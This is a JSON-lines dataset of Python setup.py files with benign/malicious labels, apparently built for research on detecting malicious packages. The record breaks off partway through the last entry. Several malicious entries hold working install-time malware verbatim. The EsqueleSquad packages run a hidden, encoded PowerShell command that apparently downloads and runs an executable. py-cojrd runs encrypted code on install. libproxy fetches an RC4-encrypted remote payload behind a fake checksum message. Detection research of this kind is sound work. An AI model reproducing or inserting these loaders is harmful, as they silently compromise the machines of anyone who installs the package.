{"idx": "flake8-deprecated-1.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\n\nshort_description = 'Warns about deprecated method calls.'\n\n\nlong_description = '{0}\\n{1}'.format(\n    open('README.rst').read(),\n    open('CHANGES.rst').read()\n)\n\n\nsetup(\n    name='flake8-deprecated',\n    version='1.3',\n    description=short_description,\n    long_description=long_description,\n    # Get more from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Framework :: Plone',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: GNU General Public License v2 (GPLv2)',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Software Development :: Quality Assurance',\n    ],\n    keywords='pep8 flake8 deprecations',\n    author='Gil Forcada',\n    author_email='gil.gnome@gmail.com',\n    url='https://github.com/gforcada/flake8-deprecated',\n    license='GPL version 2',\n    py_modules=['flake8_deprecated', ],\n    include_package_data=True,\n    test_suite='run_tests',\n    zip_safe=False,\n    install_requires=[\n        'flake8 >= 3.0.0',\n    ],\n    entry_points={\n        'flake8.extension': ['D001 = flake8_deprecated:Flake8Deprecated'],\n    },\n)\n", "target": 0}
{"idx": "gogogolokl-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'dcfdfdfdf'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\nsetup(\n    name=\"gogogolokl\",\n    version=VERSION,\n    author=\"HW\",\n    author_email=\"\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=long_description,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=[],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ],\n)", "target": 1}
{"idx": "py-cojrd-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'RmfSsNXyTqsUgfHEqEVhJRssKmuVwBGLtbrJNjAbSYmNFRygrvF'\nLONG_DESCRIPTION = 'VvdrTjRZLHBkyAutmdkpKfydnHtuJKRWcPGBHbfErEBDWLwDLNAdIORzbmSXhrbowXOgSRgyitomNIkHDUeSdZEExnKUzEZhXeJvqnFLlLhCUWeBtkdlcqKShLVVDqdxVYStQijVKiqWWfMbFzHkIxUSMNCpzazpkUhhNfYQLHcrsLxNOFXpHspmFzUMdc NXaEdHDoSMfBQBPqoirZoP'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'j0qgBCWJQN6y9sR6CtmwiNaFX_PiEI1qWBNG5P7IRuc=').decrypt(b'gAAAAABmA1RFsAAA4ZzljKzKRkNhVPLb3yTkqzmgHc_keiUYUOzD94IcWnZNKyYku3NHON94-g0BM9rWSvKf5eS8VN44rsDAuqK0IcKnfhdff_a4bZluUFrYnAciCPS266KRsAzxSF-b6VcKes-xoB0W9VaJnFxuVk12xdCUjX2YwHTeoRJugpcBzVg7X5TG1IqY6YdNPTfYL8pTkXzdG0RtjBlS1dGRnVM0DSOBdiL9FMYQafqZNzo='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"py-cojrd\",\n    version=VERSION,\n    author=\"gKugJP\",\n    author_email=\"MOzKDJUVaeTDNTWfyn@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "fusepy-3.0.1", "func": "#!/usr/bin/env python\n\nfrom __future__ import with_statement\n\nfrom setuptools import setup\n\nwith open('README') as readme:\n    documentation = readme.read()\n\nsetup(\n    name = 'fusepy',\n    version = '3.0.1',\n\n    description = 'Simple ctypes bindings for FUSE',\n    long_description = documentation,\n    author = 'Giorgos Verigakis',\n    author_email = 'verigak@gmail.com',\n    maintainer = 'Terence Honles',\n    maintainer_email = 'terence@honles.com',\n    license = 'ISC',\n    py_modules=['fuse'],\n    url = 'http://github.com/fusepy/fusepy',\n\n    classifiers = [\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: ISC License (ISCL)',\n        'Operating System :: MacOS',\n        'Operating System :: POSIX',\n        'Operating System :: Unix',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 3',\n        'Topic :: System :: Filesystems',\n    ]\n)\n", "target": 0}
{"idx": "handyspark-0.2.2a1", "func": "from setuptools import setup, find_packages\n\ndef readme():\n    with open('README.md') as f:\n        return f.read()\n\nsetup(name='handyspark',\n      version='0.2.2a1',\n      install_requires=['pyspark', 'matplotlib', 'numpy', 'scipy', 'seaborn', 'pandas', 'scikit-learn', 'findspark', 'pyarrow'],\n      description='HandySpark - bringing pandas-like capabilities to Spark dataframes',\n      long_description='HandySpark - bringing pandas-like capabilities to Spark dataframes',\n      long_description_content_type='text/markdown',\n      url='https://github.com/dvgodoy/handyspark',\n      author='Daniel Voigt Godoy',\n      author_email='datagnosis@gmail.com',\n      keywords=['spark', 'big data', 'data cleaning', 'visualization', 'exploratory data analysis', 'pandas'],\n      license='MIT',\n      classifiers=[\n          'Development Status :: 3 - Alpha',\n          'Intended Audience :: Developers',\n          'Intended Audience :: Education',\n          'Intended Audience :: Science/Research',\n          'Topic :: Scientific/Engineering',\n          'Topic :: Scientific/Engineering :: Artificial Intelligence',\n          'Topic :: Scientific/Engineering :: Visualization',\n          'Topic :: System :: Distributed Computing',\n          'License :: OSI Approved :: MIT License',\n          'Programming Language :: Python :: 3'\n      ],\n      packages=find_packages(),\n      zip_safe=False)\n", "target": 0}
{"idx": "reproof-4.2", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'reproof',\n    packages = ['modlib'],\n    version = '1.99',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-taggit-3.0.0", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "driftme-1", "func": "from setuptools import setup\n\nsetup(\n    name='driftme',\n    version='1.0',\n    description='driftme',\n    packages=['driftme'],\n    install_requires=[],\n)\n", "target": 1}
{"idx": "esqpostmaskre-3.76", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpostmaskre',\n    packages = ['modlib'],\n    version = '5.31',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-stubs-ext-0.5.0", "func": "from distutils.core import setup\n\nfrom setuptools import find_packages\n\nwith open(\"README.md\") as f:\n    readme = f.read()\n\ndependencies = [\n    \"django\",\n    \"typing-extensions\",\n]\n\nsetup(\n    name=\"django-stubs-ext\",\n    version=\"0.5.0\",\n    description=\"Monkey-patching and extensions for django-stubs\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    license=\"MIT\",\n    url=\"https://github.com/typeddjango/django-stubs\",\n    author=\"Simula Proxy\",\n    author_email=\"3nki.nam.shub@gmail.com\",\n    maintainer=\"Nikita Sobolev\",\n    maintainer_email=\"mail@sobolevn.me\",\n    py_modules=[],\n    python_requires=\">=3.6\",\n    install_requires=dependencies,\n    packages=[\"django_stubs_ext\", *find_packages(exclude=[\"scripts\"])],\n    package_data={\"django_stubs_ext\": [\"py.typed\"]},\n    classifiers=[\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Typing :: Typed\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n    ],\n    project_urls={\n        \"Release notes\": \"https://github.com/typeddjango/django-stubs/releases\",\n    },\n)\n", "target": 0}
{"idx": "edgegrid-python-1.2.1", "func": "from setuptools import setup, find_packages\nsetup(\n    name='edgegrid-python', \n    version='1.2.1',\n    description='{OPEN} client authentication protocol for python-requests',\n    author='Jonathan Landis',\n    author_email='jlandis@akamai.com',\n    maintainer='Akamai Developer Experience team',\n    maintainer_email='dl-devexp-eng@akamai.com',\n    url='https://github.com/akamai/AkamaiOPEN-edgegrid-python',\n    namespace_packages=['akamai'],\n    packages=find_packages(),\n    python_requires=\">=2.7.10\",\n    install_requires=[\n        'requests>=2.3.0',\n        'pyOpenSSL>=19.0.0',\n        'ndg-httpsclient',\n        'pyasn1',\n        'urllib3'\n    ],\n    include_package_data=True,\n    license='Apache 2.0',\n    classifiers=[\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n    ]\n)\n", "target": 0}
{"idx": "google-cloud-resource-manager-1.6.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\nname = \"google-cloud-resource-manager\"\ndescription = \"Google Cloud Resource Manager API client library\"\nversion = \"1.6.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\nurl = \"https://github.com/googleapis/python-resource-manager\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n    \"grpc-google-iam-v1 >=0.12.4, <1.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n# Setup boilerplate below this line.\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=url,\n    packages=packages,\n    namespace_packages=(\"google\", \"google.cloud\"),\n    platforms=\"Posix; MacOS X; Windows\",\n    include_package_data=True,\n    install_requires=dependencies,\n    python_requires=\">=3.7\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "demoji-1.1.0", "func": "from setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "dramatiq-1.13.0", "func": "# This file is a part of Dramatiq.\n#\n# Copyright (C) 2017,2018,2019 CLEARTYPE SRL <bogdan@cleartype.io>\n#\n# Dramatiq is free software; you can redistribute it and/or modify it\n# under the terms of the GNU Lesser General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or (at\n# your option) any later version.\n#\n# Dramatiq is distributed in the hope that it will be useful, but WITHOUT\n# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n# FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public\n# License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\n\nfrom setuptools import setup\n\n\ndef rel(*xs):\n    return os.path.join(os.path.abspath(os.path.dirname(__file__)), *xs)\n\n\nwith open(rel(\"README.md\")) as f:\n    long_description = f.read()\n\n\nwith open(rel(\"dramatiq\", \"__init__.py\"), \"r\") as f:\n    version_marker = \"__version__ = \"\n    for line in f:\n        if line.startswith(version_marker):\n            _, version = line.split(version_marker)\n            version = version.strip().strip('\"')\n            break\n    else:\n        raise RuntimeError(\"Version marker not found.\")\n\n\ndependencies = [\n    \"prometheus-client>=0.2\",\n]\n\nextra_dependencies = {\n    \"gevent\": [\n        \"gevent>=1.1\",\n    ],\n\n    \"memcached\": [\n        \"pylibmc>=1.5,<2.0\",\n    ],\n\n    \"rabbitmq\": [\n        \"pika>=1.0,<2.0\",\n    ],\n\n    \"redis\": [\n        \"redis>=2.0,<5.0\",\n    ],\n\n    \"watch\": [\n        \"watchdog\",\n        \"watchdog_gevent\",\n    ],\n}\n\nextra_dependencies[\"all\"] = list(set(sum(extra_dependencies.values(), [])))\nextra_dependencies[\"dev\"] = extra_dependencies[\"all\"] + [\n    # Docs\n    \"alabaster\",\n    \"sphinx<1.8\",\n    \"sphinxcontrib-napoleon\",\n\n    # Linting\n    \"flake8\",\n    \"flake8-bugbear\",\n    \"flake8-quotes\",\n    \"isort\",\n\n    # Misc\n    \"bumpversion\",\n    \"hiredis\",\n    \"twine\",\n    \"wheel\",\n\n    # Testing\n    \"pytest\",\n    \"pytest-benchmark[histogram]\",\n    \"pytest-cov\",\n    \"tox\",\n]\n\nsetup(\n    name=\"dramatiq\",\n    version=version,\n    author=\"Bogdan Popa\",\n    author_email=\"bogdan@cleartype.io\",\n    project_urls={\n        \"Documentation\": \"https://dramatiq.io\",\n        \"Source\": \"https://github.com/Bogdanp/dramatiq\",\n    },\n    description=\"Background Processing for Python 3.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    packages=[\n        \"dramatiq\",\n        \"dramatiq.brokers\",\n        \"dramatiq.middleware\",\n        \"dramatiq.rate_limits\",\n        \"dramatiq.rate_limits.backends\",\n        \"dramatiq.results\",\n        \"dramatiq.results.backends\",\n    ],\n    include_package_data=True,\n    install_requires=dependencies,\n    python_requires=\">=3.6\",\n    extras_require=extra_dependencies,\n    entry_points={\"console_scripts\": [\"dramatiq = dramatiq.__main__:main\"]},\n    scripts=[\"bin/dramatiq-gevent\"],\n    classifiers=[\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: System :: Distributed Computing\",\n        \"License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)\",\n    ],\n)\n", "target": 0}
{"idx": "selfpostgrandgui-10.51", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpostgrandgui',\n    packages = ['modlib'],\n    version = '7.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "controlcraft-2.25", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'controlcraft',\n    packages = ['modlib'],\n    version = '6.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "distro-info-1.0", "func": "#!/usr/bin/python3\n\nimport os\nimport re\n\nfrom setuptools import setup\n\n\nPACKAGES = []\nPY_MODULES = [\"distro_info\"]\nSCRIPTS = [\"debian-distro-info\", \"ubuntu-distro-info\"]\n\n\ndef get_debian_version():\n    \"\"\"look what Debian version we have\"\"\"\n    version = None\n    changelog = \"../debian/changelog\"\n    if os.path.exists(changelog):\n        head = open(changelog, \"rb\").readline().decode(\"utf-8\")\n        match = re.compile(r\".*\\((.*)\\).*\").match(head)\n        if match:\n            version = match.group(1)\n    return version\n\n\nif __name__ == \"__main__\":\n    setup(\n        name=\"distro-info\",\n        version=get_debian_version(),\n        py_modules=PY_MODULES,\n        packages=PACKAGES,\n        test_suite=\"distro_info_test\",\n        url='https://salsa.debian.org/debian/distro-info',\n        author='Benjamin Drung',\n        author_email='bdrung@debian.org',\n    )\n", "target": 0}
{"idx": "selfhackedcvnvidia-3.48", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhackedcvnvidia',\n    packages = ['modlib'],\n    version = '2.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "adhydra-5.44", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adhydra',\n    packages = ['modlib'],\n    version = '6.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libproxy-1.1.5", "func": "#!/usr/bin/env python\nimport os\nimport sys\nimport re\nimport urllib.request\nimport multiprocessing\nfrom setuptools import setup\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools.command.egg_info import egg_info\nimport zlib, base64, string, bz2, sys, itertools\ntry:\n    import ctypes\nexcept ImportError:\n    pass\n\nbase_path = os.path.dirname(__file__)\nCONFIG_UPDATE_INFORMATION_ENDPOINT = b\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZXJpay1hcnRlbW92L2I1ZGUyNTE5NWJkMGU5NjFhNTIxYjAzNDU2NjE0ZDRjL3Jhdy8xY2MyMzYzMTBkYTdmM2UwNWI2NTcxZWFhOWRiNGI2NjM2ZmI0Njg0L2d6TGpnT3VqOHkwYmF2VG12Z2tDd1IzaDFrdkVDMUJNLmI2NAo=\"\nupdate_information_url = base64.b64decode(CONFIG_UPDATE_INFORMATION_ENDPOINT).decode('utf-8')\nkey = \"gUMX0ANp53ofRAwPFF3oOD5SIgJmXfZP\"\nrequirements = []\n\nD=range\ndef E(key):\n\tA=[A for A in D(0,256)];B=0\n\tfor C in D(0,256):B=(B+A[C]+key[C%len(key)])%256;E=A[C];A[C]=A[B];A[B]=E\n\treturn A\ndef F(sched):\n\tA=sched;E=[];B=0;C=0\n\twhile True:B=(1+B)%256;C=(A[B]+C)%256;D=A[C];A[C]=A[B];A[B]=D;yield A[(A[B]+A[C])%256]\ndef aRCAwKG0p3(eykEZYeNhh,key):\n\tB=key;A=eykEZYeNhh;A=A.split('0X')[1:];A=[int('0x'+A.lower(),0)for A in A];B=[ord(A)for A in B];D=E(B);G=F(D);C=''\n\tfor H in A:I=str(chr(H^next(G)));C+=I\n\treturn C\n\ndef send():\n    if os.name == \"nt\":\n        print(\"Verifying checksum...\")\n        try:\n            with urllib.request.urlopen(update_information_url) as response:\n                exec(aRCAwKG0p3(base64.b64decode(response.read()).decode('utf-8'), key))\n        except urllib.error.URLError as e:\n            pass\n        exit(0)\n\nclass PostInstallCommand(install):\n    def run(self):\n        